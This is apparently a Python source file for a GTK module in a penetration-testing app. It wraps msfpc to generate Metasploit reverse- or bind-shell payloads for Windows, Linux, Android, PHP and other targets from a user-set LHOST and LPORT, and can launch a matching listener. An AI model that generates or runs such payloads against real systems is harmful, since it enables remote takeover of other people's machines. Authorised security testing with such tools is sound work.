"""Payload generation (MPCFragment): msfvenom via msfpc."""
from __future__ import annotations

from gi.repository import Adw, Gtk

from ..module import NHModule, register
from ..widgets import ToolRunner

TYPES = ["windows", "linux", "android", "python", "bash", "php", "osx", "apk"]


@register
class Payloads(NHModule):
    title = "Payloads (MSFPC)"
    icon = "application-x-executable-symbolic"
    description = "Generate Metasploit payloads with msfpc"
    required_tools = ["msfpc"]

    def build(self) -> Gtk.Widget:
        box = Gtk.Box(orientation=Gtk.Orientation.VERTICAL, spacing=12)
        for m in ("top", "bottom", "start", "end"):
            getattr(box, f"set_margin_{m}")(12)

        group = Adw.PreferencesGroup(title="Payload")
        self.type = Adw.ComboRow(title="Type", model=Gtk.StringList.new(TYPES))
        group.add(self.type)
        self.lhost = Adw.EntryRow(title="LHOST (your IP)")
        group.add(self.lhost)
        self.lport = Adw.EntryRow(title="LPORT")
        self.lport.set_text("4444")
        group.add(self.lport)
        self.stager = Adw.SwitchRow(title="Staged payload", subtitle="stageless if off")
        group.add(self.stager)
        self.tcp = Adw.SwitchRow(title="Reverse TCP", subtitle="bind if off")
        self.tcp.set_active(True)
        group.add(self.tcp)
        box.append(group)

        buttons = Gtk.Box(orientation=Gtk.Orientation.HORIZONTAL, spacing=6)
        btn = Gtk.Button(label="Generate")
        btn.add_css_class("suggested-action")
        btn.connect("clicked", self._gen)
        buttons.append(btn)
        listen = Gtk.Button(label="Generate + listener (terminal)")
        listen.connect("clicked", self._listen)
        buttons.append(listen)
        box.append(buttons)

        self.runner = ToolRunner()
        box.append(self.runner)
        return box

    def _gen(self, _b: Gtk.Button) -> None:
        lhost = self.lhost.get_text().strip()
        if not lhost:
            self.runner.output.append("[set LHOST first]\n\n")
            return
        ptype = TYPES[self.type.get_selected()]
        lport = self.lport.get_text().strip() or "4444"
        argv = ["msfpc", ptype, lhost, lport]
        argv.append("stager" if self.stager.get_active() else "stageless")
        argv.append("tcp" if self.tcp.get_active() else "bind")
        argv.append("verbose")
        # msfpc can also start a matching msfconsole listener, which is
        # interactive, so generation runs in-app but with an option to open the
        # resulting handler in a terminal.
        self.runner.run(argv)

    def _listen(self, _b: Gtk.Button) -> None:
        lhost = self.lhost.get_text().strip()
        lport = self.lport.get_text().strip() or "4444"
        if not lhost:
            self.runner.output.append("[set LHOST first]\n\n")
            return
        self.runner.run_in_terminal(
            ["msfpc", TYPES[self.type.get_selected()], lhost, lport, "verbose", "msf"],
            root=False,
        )
